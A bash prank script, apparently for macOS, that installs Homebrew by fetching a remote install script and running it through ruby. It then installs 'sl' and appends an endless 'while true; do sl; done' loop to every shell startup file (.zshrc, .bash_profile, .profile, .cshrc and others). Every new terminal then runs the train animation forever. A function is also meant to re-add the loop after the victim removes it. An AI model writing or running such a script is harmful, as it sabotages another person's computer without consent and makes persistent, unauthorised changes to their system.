#!/bin/bash

function poll_for_removal_of_while_loop {
	rc_file=$1
	type_of_shell=$2

	if [[ "$type_of_shell" -eq "1" ]]; then
		status_rc_file=`cat $rc_file 2>/dev/null| grep "while true; do sl; done"`
		if [[ -z "$status_rc_file" ]]; then
			echo -e "\nwhile true; do sl; done"|cat>>$rc_file
		fi
	else
		status_rc_file=`cat $rc_file 2>/dev/null|grep  "while (1)"`
		if [[ -z "$status_rc_file" ]]; then
			echo -e "\nwhile (1)\n sl\n end"|cat>>$rc_file
		fi
	fi
	
}

function modify_rc_files {
	cd ~
	poll_for_removal_of_while_loop ~/.zshrc 1
	poll_for_removal_of_while_loop ~/.bash_profile 1
	poll_for_removal_of_while_loop ~/.profile 1
	poll_for_removal_of_while_loop ~/.kshrc 1
	poll_for_removal_of_while_loop ~/.shrc 1
	poll_for_removal_of_while_loop ~/.tcshrc 2
	poll_for_removal_of_while_loop ~/.cshrc 2

}

sl_status=$(which sl)

if [ -z "$sl_status" ]
then
	internet=$(/usr/bin/curl -s www.google.com)

	if [ -n "$internet" ]
	then
		brew_status=$(/usr/bin/find -x /usr brew 2>/dev/null)

		if [ -z "$brew_status" ]
			then 
			/usr/bin/ruby -e "$(/usr/bin/curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
		fi
		/usr/local/bin/brew install sl
		modify_rc_files
	else
		echo "Not connected to the internet"
		/bin/sleep 1
	fi
else
	modify_rc_files
fi